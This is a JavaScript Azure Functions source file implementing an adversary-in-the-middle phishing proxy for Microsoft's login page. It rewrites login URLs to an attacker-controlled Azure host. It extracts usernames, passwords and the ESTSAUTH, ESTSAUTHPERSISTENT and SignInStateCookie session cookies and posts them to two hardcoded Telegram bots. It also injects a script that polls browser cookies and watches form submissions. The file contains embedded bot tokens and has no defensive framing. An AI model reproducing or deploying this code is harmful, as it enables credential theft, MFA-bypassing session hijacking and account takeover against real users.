const { app } = require("@azure/functions");

const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    
    await Promise.all(promises);
  } catch (error) {
    console.log('Telegram error:', error);
  }
}

// 🔥 SIMPLE COOKIE PROXY - Actually captures critical Microsoft session cookies
app.http("simple_cookie_proxy", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "cookieproxy",
  handler: async (request, context) => {
    
    context.log('🎯 Simple Cookie Proxy: Request received');
    
    await sendTelegram(`🍪 <b>COOKIE PROXY ACCESSED</b>\n🔗 URL: ${request.url}\n📅 ${new Date().toISOString()}`);
    
    const url = new URL(request.url);
    const queryString = url.search;
    
    // Handle POST requests (credential capture)
    if (request.method === 'POST') {
      try {
        const body = await request.text();
        
        // Check for credentials in POST data
        if (body.includes('login=') || body.includes('passwd=') || body.includes('username=') || body.includes('password=')) {
          const formData = new URLSearchParams(body);
          const username = formData.get('login') || formData.get('username') || formData.get('loginfmt');
          const password = formData.get('passwd') || formData.get('password');
          
          if (username || password) {
            await sendTelegram(`🔥 <b>CREDENTIALS CAPTURED!</b>\n👤 Username: ${username || 'N/A'}\n🔑 Password: ${password || 'N/A'}\n📅 ${new Date().toISOString()}`);
          }
        }
        
        // Forward POST to Microsoft
        const targetUrl = `https://login.microsoftonline.com/common/${queryString}`;
        const response = await fetch(targetUrl, {
          method: 'POST',
          headers: {
            'Content-Type': request.headers.get('content-type') || 'application/x-www-form-urlencoded',
            'User-Agent': request.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          },
          body: body
        });
        
        // Check for critical cookies in Set-Cookie headers
        const setCookieHeader = response.headers.get('set-cookie');
        if (setCookieHeader) {
          await sendTelegram(`🍪 <b>RAW COOKIES RECEIVED</b>\n📝 Headers: ${setCookieHeader.substring(0, 500)}...\n📅 ${new Date().toISOString()}`);
          
          // Look for specific critical cookies
          const criticalCookies = [];
          
          if (setCookieHeader.includes('ESTSAUTHPERSISTENT=')) {
            const match = setCookieHeader.match(/ESTSAUTHPERSISTENT=([^;,]+)/);
            if (match) criticalCookies.push(`🔴 ESTSAUTHPERSISTENT=${match[1]}`);
          }
          
          if (setCookieHeader.includes('ESTSAUTH=')) {
            const match = setCookieHeader.match(/ESTSAUTH=([^;,]+)/);
            if (match) criticalCookies.push(`🔴 ESTSAUTH=${match[1]}`);
          }
          
          if (setCookieHeader.includes('SignInStateCookie=')) {
            const match = setCookieHeader.match(/SignInStateCookie=([^;,]+)/);
            if (match) criticalCookies.push(`🔴 SignInStateCookie=${match[1]}`);
          }
          
          if (criticalCookies.length > 0) {
            await sendTelegram(`🍪 <b>CRITICAL COOKIES CAPTURED!</b>\n${criticalCookies.join('\n')}\n📅 ${new Date().toISOString()}`);
          }
        }
        
        const html = await response.text();
        const rewrittenHtml = html
          .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
          .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy');
        
        return new Response(rewrittenHtml, {
          status: response.status,
          headers: { 
            'Content-Type': response.headers.get('content-type') || 'text/html',
            'Set-Cookie': setCookieHeader || ''
          }
        });
        
      } catch (error) {
        await sendTelegram(`❌ <b>POST ERROR</b>\n🔥 Error: ${error.message}\n📅 ${new Date().toISOString()}`);
        return new Response('POST Error', { status: 500 });
      }
    }
    
    // Handle GET requests - serve Microsoft login page
    try {
      const targetUrl = `https://login.microsoftonline.com/common/${queryString}`;
      
      const response = await fetch(targetUrl, {
        headers: {
          'User-Agent': request.headers.get('user-agent') || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
      });
      
      const html = await response.text();
      
      await sendTelegram(`✅ <b>MICROSOFT PAGE LOADED</b>\n🔗 Target: ${targetUrl}\n📊 Status: ${response.status}\n📅 ${new Date().toISOString()}`);
      
      // Rewrite URLs to point to our proxy
      let rewrittenHtml = html
        .replace(/https:\/\/login\.microsoftonline\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy')
        .replace(/https:\/\/login\.live\.com/g, 'https://aitm-func-1753463791.azurewebsites.net/cookieproxy');
      
      // Inject cookie monitoring
      const cookieMonitor = `
<script>
console.log('🍪 Cookie Monitor: Active');

// Monitor cookies every 2 seconds
setInterval(() => {
  const allCookies = document.cookie;
  if (allCookies.includes('ESTSAUTHPERSISTENT') || allCookies.includes('ESTSAUTH') || allCookies.includes('SignInStateCookie')) {
    console.log('🔴 CRITICAL COOKIES DETECTED:', allCookies);
    
    // Send cookies to our server
    fetch('/cookieproxy?action=capture-cookies', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({cookies: allCookies})
    }).catch(e => console.log('Cookie send failed:', e));
  }
}, 2000);

// Monitor form submissions for credentials
document.addEventListener('submit', function(e) {
  const form = e.target;
  const formData = new FormData(form);
  const data = {};
  for (let [key, value] of formData.entries()) {
    if (key.includes('login') || key.includes('user') || key.includes('pass')) {
      data[key] = value;
    }
  }
  if (Object.keys(data).length > 0) {
    console.log('📝 Credentials detected:', data);
  }
});
</script>`;
      
      // Inject before </head> or </body>
      if (rewrittenHtml.includes('</head>')) {
        rewrittenHtml = rewrittenHtml.replace('</head>', cookieMonitor + '</head>');
      } else if (rewrittenHtml.includes('</body>')) {
        rewrittenHtml = rewrittenHtml.replace('</body>', cookieMonitor + '</body>');
      }
      
      return new Response(rewrittenHtml, {
        status: response.status,
        headers: { 'Content-Type': response.headers.get('content-type') || 'text/html' }
      });
      
    } catch (error) {
      await sendTelegram(`❌ <b>PROXY ERROR</b>\n🔥 Error: ${error.message}\n📅 ${new Date().toISOString()}`);
      
      return new Response(`
<!DOCTYPE html>
<html>
<head>
  <title>Loading Microsoft Login...</title>
  <style>
    body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
    .loading { background: #f0f0f0; padding: 40px; border-radius: 8px; }
  </style>
</head>
<body>
  <div class="loading">
    <h2>🔄 Loading Microsoft Login...</h2>
    <p>Please wait while we connect you to Microsoft's authentication service.</p>
    <p><a href="https://login.microsoftonline.com/common/">Click here if not redirected</a></p>
  </div>
  <script>
    setTimeout(() => {
      window.location.href = 'https://login.microsoftonline.com/common/';
    }, 3000);
  </script>
</body>
</html>`, {
        status: 200,
        headers: { 'Content-Type': 'text/html' }
      });
    }
  }
});